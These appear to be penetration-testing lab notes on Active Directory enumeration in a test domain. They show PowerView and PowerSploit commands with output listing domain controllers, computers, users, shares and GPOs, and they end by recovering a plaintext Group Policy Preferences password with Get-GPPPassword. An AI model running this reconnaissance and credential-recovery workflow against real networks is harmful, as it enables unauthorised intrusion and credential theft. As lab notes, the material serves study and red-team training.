
# Active Directory Enumeration

## Get current Domain and Domain controller

	$var = [System.DirectoryServices.ActiveDirectory.Domain]
	$var::GetCurrentDomain()

Powerview

	Recon> Get-NetDomain
	
	
	Forest                  : valhalla.local
	DomainControllers       : {odin.valhalla.local}
	Children                : {}
	DomainMode              :
	Parent                  :
	PdcRoleOwner            : odin.valhalla.local
	RidRoleOwner            : odin.valhalla.local
	InfrastructureRoleOwner : odin.valhalla.local
	Name                    : valhalla.local
	

## Cet AD Computers

	PS C:\Users\mrblack\Desktop\PowerSploit\Recon> Get-NetComputer | select cn,operatingsystem
	cn   operatingsystem
	--   ---------------
	ODIN Windows Server 2012 R2 Standard Evaluation
	THOR Windows 7 Professional
	LOKI Windows 10 Pro

Later it could be used for detecting subnets and ip. Script to resolv hostname to ip

	foreach($line in [System.IO.File]::ReadLines("C:\path\to\ip.txt"))
	
	{
		   Resolve-DnsName $line > result.txt
	}
	
 [Credit](https://stackoverflow.com/a/47146987)

## Get AD users and details


	PS C:\Users\mrblack\Desktop\PowerSploit\Recon> Get-DomainUser | select samaccountname, cn, title, description

	samaccountname cn                 title                                    description
	-------------- --                 -----                                    -----------
	Administrator  Administrator                                               Built-in account for administering the computer/domain
	Guest          Guest                                                       Built-in account for guest access to the computer/domain
	krbtgt         krbtgt                                                      Key Distribution Center Service Account
	danj           Dan Jump           CEO
	adamb          Adam Barr          General Manager of Professional Services
	alans          Alan Steiner       Director of Project Management Team
	dianet         Diane Tibbot       CFO of Professional Services
	danp           Dan Park           Vice President NA Sales
	davidm         David Maman        Strategy Consulting Manager
	alanb          Alan Brewer        Regional Sales Manager
	davids         David Simpson      Sales Manager
	eduardd        Eduard Dell        Regional Sales Manager
	aaronp         Aaron Painter      Strategy Consulting Manager
	dianep         Diane Prescott     Director of Ad Sales
	ellena         Ellen Adams        Strategy Consulting Manager
	davidz         David Zazzo        Managing Director
	davidh         David Hamilton     CRM Consultant
	allang         Allan Guinot       Engineer
	donh           Don Hall           Strategy Consultant
	allisob        Allison Brown      Strategy Consultant
	davidd         David Derwin       Project Manager
	davids1        David So           Project Manager
	alexans        Alexandre Silva    Project Manager
	qiongw         Qiong Wu           Project Manager
	doughm         Dough Mahugh       Project Manager
	danb           Dan Bacon          Project Manager
	danield        Daniel Durrer      Project Manager
	alfonsp        Alfons Parovszky   Content Management Consultant
	corinnb        Corinna Bolender   Engineer
	rayc           Ray Chow           Strategy Consultant
	dianeg         Diane Glimp        Content Management Consultant
	elizaba        Elizabeth Andersen Salesperson
	denisd         Denis Dehenne      Project Manager
	davidw         David Wright       Salesperson
	alisal         Alisa Lawyer       Project Manager
	donf           Don Funk           Project Manager
	daven          Dave Natsuhara     Project Manager
	raym           Ray Mohrman        Senior Project Manager
	dannio         Danni Ortman       Senior Project Manager
	yex            Ye Xu              Salesperson
	dominip        Dominik Paiha      Salesperson
	danh           Dan Hough          Salesperson
	davidb         David Bossard      Salesperson
	aliciat        Alicia Thomber     Salesperson
	davidb1        David Bradley      Manager
	roastme        roastme
	kerberoastme   kerberoastme
	testuser       testuser                                                    Password Pass123!
	dontmindme     dontmindme
	iwouldmind     iwouldmind
	mrblack        mrblack
	lazyuser       lazyuser


## Get shares on AD environment

	PS C:\Users\mrblack\Desktop\PowerSploit\Recon> Find-DomainShare

	Name           Type Remark              ComputerName
	----           ---- ------              ------------
	ADMIN$   2147483648 Remote Admin        odin.valhalla.local
	C$       2147483648 Default share       odin.valhalla.local
	IPC$     2147483651 Remote IPC          odin.valhalla.local
	NETLOGON          0 Logon server share  odin.valhalla.local
	share             0                     odin.valhalla.local
	SYSVOL            0 Logon server share  odin.valhalla.local
	ADMIN$   2147483648 Remote Admin        loki.valhalla.local
	C$       2147483648 Default share       loki.valhalla.local
	IPC$     2147483651 Remote IPC          loki.valhalla.local
	share             0                     loki.valhalla.local


## Get shares on AD only user has permission


	PS C:\Users\mrblack\Desktop\PowerSploit\Recon> Find-DomainShare -CheckShareAccess

	Name           Type Remark              ComputerName
	----           ---- ------              ------------
	NETLOGON          0 Logon server share  odin.valhalla.local
	share             0                     odin.valhalla.local
	SYSVOL            0 Logon server share  odin.valhalla.local
	ADMIN$   2147483648 Remote Admin        loki.valhalla.local
	C$       2147483648 Default share       loki.valhalla.local
	share             0                     loki.valhalla.local



## Get GPO objects 


	PS C:\Users\mrblack\Desktop\PowerSploit\Recon> Get-DomainGPO | select displayname, gpcfilesyspath

	displayname                       gpcfilesyspath
	-----------                       --------------
	Default Domain Policy             \\valhalla.local\sysvol\valhalla.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}
	Default Domain Controllers Policy \\valhalla.local\sysvol\valhalla.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}
	file_copy                         \\valhalla.local\SysVol\valhalla.local\Policies\{3B55057F-EE19-469C-ACD6-37D9F3325D0A}
	Create Local Admin                \\valhalla.local\SysVol\valhalla.local\Policies\{D96909A1-1659-40E6-894A-50B01B469E19}
	Disable Firewall                  \\valhalla.local\SysVol\valhalla.local\Policies\{42EFB49A-9915-4DDD-8B97-77B1AE262A48}
	Disable Windows Defender          \\valhalla.local\SysVol\valhalla.local\Policies\{AF7B0056-348A-45D1-A9D3-490C93DFD017}


## Get GPP password

	PS C:\Users\mrblack\Desktop\PowerSploit\Exfiltration> . .\Get-GPPPassword.ps1
	PS C:\Users\mrblack\Desktop\PowerSploit\Exfiltration> Get-GPPPassword


	UserName  : gpomademe
	NewName   : [BLANK]
	Password  : Password123!
	Changed   : 2021-08-20 13:44:44
	File      : C:\ProgramData\Microsoft\Group
				Policy\History\{D96909A1-1659-40E6-894A-50B01B469E19}\Machine\Preferences\Groups\Groups.xml
	NodeName  : Groups
	Cpassword : VPe/o9YRyz2cksnYRbNeQoC7S+/HhWsGEcuvup04p1E
